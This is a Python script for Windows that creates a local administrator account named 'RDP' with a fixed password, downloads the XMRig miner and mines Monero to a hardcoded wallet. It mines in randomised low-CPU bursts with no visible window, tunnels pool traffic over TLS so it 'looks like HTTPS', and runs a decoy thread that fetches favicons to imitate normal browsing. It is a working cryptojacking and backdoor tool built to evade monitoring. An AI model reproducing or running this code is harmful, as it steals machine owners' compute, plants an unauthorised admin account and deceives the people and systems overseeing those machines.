import os
import subprocess
import tempfile
import time
import random
import threading
import urllib.request
import zipfile
import json

# ==================== Configuration ====================
WALLET = "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP"
POOL = "pool.supportxmr.com:443"          # TLS, looks like HTTPS
RUNTIME_MINUTES = 180                     # 3 hours

# Burst parameters (minutes)
MIN_WORK = 1
MAX_WORK = 8
MIN_BREAK = 0.5
MAX_BREAK = 3
MIN_CPU_HINT = 5
MAX_CPU_HINT = 25

def create_user():
    try:
        subprocess.run(['net', 'user', 'RDP', 'Runner-12345', '/add'], check=True, capture_output=True)
        subprocess.run(['net', 'localgroup', 'Administrators', 'RDP', '/add'], check=True)
        print("[+] User 'RDP' created.")
    except subprocess.CalledProcessError as e:
        print(f"[!] User creation failed: {e.stderr.decode()}")

def download_xmrig():
    miner_url = "https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-msvc-win64.zip"
    zip_path = os.path.join(tempfile.gettempdir(), 'xmrig.zip')
    extract_dir = os.path.join(tempfile.gettempdir(), 'xmrig')
    print("[+] Downloading miner...")
    urllib.request.urlretrieve(miner_url, zip_path)
    with zipfile.ZipFile(zip_path, 'r') as z:
        z.extractall(extract_dir)
    for root, dirs, files in os.walk(extract_dir):
        if 'xmrig.exe' in files:
            exe_path = os.path.join(root, 'xmrig.exe')
            print(f"[+] Miner downloaded to {exe_path}")
            return exe_path
    raise Exception("xmrig.exe not found")

def web_surfer(stop_event):
    urls = [
        "https://www.google.com/favicon.ico",
        "https://github.com/favicon.ico",
        "https://cloudflare.com/favicon.ico",
        "https://microsoft.com/favicon.ico"
    ]
    while not stop_event.is_set():
        url = random.choice(urls)
        try:
            print(f"[Web] Fetching {url}")
            urllib.request.urlretrieve(url, os.devnull)
            print(f"[Web] Fetched {url}")
        except Exception as e:
            print(f"[Web] Error: {e}")
        sleep_time = random.randint(5, 15)
        for _ in range(sleep_time):
            if stop_event.is_set():
                break
            time.sleep(1)

def main():
    create_user()
    exe_path = download_xmrig()
    working_dir = os.path.dirname(exe_path)

    stop_event = threading.Event()
    web_thread = threading.Thread(target=web_surfer, args=(stop_event,), daemon=True)
    web_thread.start()
    print("[+] Web surfer thread started.")

    total_start = time.time()
    total_end = total_start + RUNTIME_MINUTES * 60

    while time.time() < total_end:
        work_sec = random.randint(MIN_WORK * 60, MAX_WORK * 60)
        break_sec = random.randint(int(MIN_BREAK * 60), int(MAX_BREAK * 60))
        cpu_hint = random.randint(MIN_CPU_HINT, MAX_CPU_HINT)

        print(f"\n[+] Burst: work {work_sec//60} min, break {break_sec//60} min, CPU hint {cpu_hint}%")

        # Command-line arguments (no config file)
        cmd = [
            exe_path,
            f"--url={POOL}",
            f"--user={WALLET}",
            "--pass=x",
            "--tls",
            "--keepalive",
            f"--cpu-max-threads-hint={cpu_hint}",
            "--cpu-priority=5",
            "--randomx-mode=fast",
            "--donate-level=1",
            "--no-color"
        ]

        print(f"[+] Starting miner: {' '.join(cmd)}")
        miner_proc = subprocess.Popen(
            cmd,
            cwd=working_dir,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        print(f"[+] Miner started (PID {miner_proc.pid})")

        # Monitor miner output during work period
        work_start = time.time()
        while time.time() - work_start < work_sec:
            # Read a line (non-blocking)
            line = miner_proc.stdout.readline()
            if line:
                print(f"[Miner] {line.strip()}")
            else:
                # No output, check if process died
                if miner_proc.poll() is not None:
                    print(f"[!] Miner died. Exit code: {miner_proc.returncode}")
                    break
                # If alive but no output, wait a bit
                time.sleep(0.5)

        # Kill miner if still alive
        if miner_proc.poll() is None:
            miner_proc.terminate()
            miner_proc.wait(timeout=10)
            print("[+] Miner stopped.")
        else:
            print("[+] Miner already stopped.")

        # Break period
        print(f"[+] Breaking for {break_sec//60} minutes...")
        for _ in range(break_sec):
            if time.time() >= total_end or stop_event.is_set():
                break
            time.sleep(1)

    stop_event.set()
    web_thread.join(timeout=10)
    print("[+] Job completed.")

if __name__ == "__main__":
    main()
